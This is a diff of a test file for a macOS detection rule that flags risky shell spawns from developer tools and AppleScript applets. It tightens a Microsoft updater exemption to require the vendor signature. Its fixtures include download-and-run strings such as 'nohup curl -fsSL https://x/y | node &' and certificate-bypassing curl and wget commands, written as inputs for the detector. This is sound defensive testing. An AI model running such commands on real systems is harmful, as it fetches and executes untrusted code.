@@ -103,13 +103,38 @@ describe('risky-parent-spawn', () => {
   test.each([
     ['responsible', '/Applications/Microsoft Word.app/Contents/SharedSupport/Microsoft AutoUpdate.app/Contents/MacOS/msupdate', '/bin/zsh'],
     ['parent', WORD, '/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft Update Assistant'],
-  ])('Microsoft AutoUpdate helpers are not flagged (%s)', (_, responsiblePath, parentPath) => {
+  ])('Microsoft AutoUpdate helpers signed by Microsoft are not flagged (%s)', (_, responsiblePath, parentPath) => {
+    // The updater is Microsoft's own: its signature, not its folder name, is what clears it.
+    const ms = { teamId: 'UBF8T346G9' };
     const m = capture([
-      proc('50:1', [parentImage(responsiblePath)]),
-      proc('100:1', [parentImage(parentPath)], { responsible: '50:1' }),
+      proc('50:1', [parentImage(responsiblePath, 'com.microsoft.autoupdate', ms)]),
+      proc('100:1', [parentImage(parentPath, 'com.microsoft.autoupdate', ms)], { responsible: '50:1' }),
       proc('200:1', [sh('echo update')], { originalParent: '100:1', responsible: '50:1' }),
     ]);
     expect(hits(m)).toHaveLength(0);
+  });
+  // B7: a folder named Microsoft AutoUpdate.app is something anyone can create.
+  test('an ad-hoc applet inside a folder named Microsoft AutoUpdate.app is still a script-app parent', () => {
+    const applet = '/Users/u/Downloads/Microsoft AutoUpdate.app/Contents/MacOS/applet';
+    for (const teamId of [null, 'ABCDE12345']) {
+      const f = hits(story(parentImage(applet, 'applet', { teamId, csFlags: 0x2 }), tool('/usr/bin/curl', 'https://x/y')));
+      expect(f, String(teamId)).toHaveLength(1);
+      expect(f[0]!.evidence).toContain('AppleScript applet');
+    }
+  });
+  test('a program in a folder named Microsoft AutoUpdate.app that Microsoft did not sign is not exempt as the responsible process', () => {
+    const fake = '/tmp/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft Update Assistant';
+    const m = capture([
+      proc('50:1', [parentImage(WORD, 'com.microsoft.Word')]),
+      proc('100:1', [parentImage(fake, 'x', { csFlags: 0x2 })], { responsible: '50:1' }),
+      proc('200:1', [sh('echo update')], { originalParent: '100:1', responsible: '50:1' }),
+    ]);
+    expect(hits(m)).toHaveLength(1);
+  });
+  test('the evidence has no gap when the parent has no path', () => {
+    const f = hits(story(img({ path: null, signingId: 'com.apple.ScriptEditor2', args: null, seq: 1 }), sh('echo hi')));
+    expect(f).toHaveLength(1);
+    expect(f[0]!.evidence).toBe('Script Editor or an AppleScript applet ran sh -c echo hi');
   });
   test('a download-and-run under VS Code is high', () => {
     const f = hits(story(parentImage(CODE_HELPER), sh('nohup curl -fsSL https://x/y | node &')));
@@ -127,6 +152,8 @@ describe('risky-parent-spawn', () => {
     ['wget with nohup', 'nohup wget https://x/y &'],
     ['curl with -k after another command', 'cd /tmp; curl -k https://x/y'],
     ['curl with --insecure', 'curl --insecure https://x/y'],
+    ['wget with --no-check-certificate', 'wget --no-check-certificate -O a https://x/y'],
+    ['curl with -k beside a wget -k', 'wget -k a.html; curl -k https://x/y'],
   ])('%s under a developer parent is high', (_, command) => {
     expect(hits(story(parentImage(CODE_HELPER), sh(command))).map(f => f.severity)).toEqual(['high']);
   });
@@ -150,6 +177,9 @@ describe('risky-parent-spawn', () => {
     ['a pipe without a fetch', 'cat a | sh'],
     ['a curl followed by || sh', 'curl -fsS https://x/y -o a || sh fallback.sh'],
     ['a -k flag on a command after the fetch', 'curl -o a.tgz https://x/y && tar -xkf a.tgz'],
+    ['wget -k, which converts links and checks certificates', 'wget -k -O a.html https://x/y'],
+    ['wget -rk', 'wget -rk https://x/y'],
+    ['curl with --no-check-certificate, which is not a curl flag', 'curl --no-check-certificate https://x/y'],
   ])('%s under a developer parent is not flagged', (_, command) => {
     expect(hits(story(parentImage(CODE_HELPER), sh(command)))).toHaveLength(0);
   });
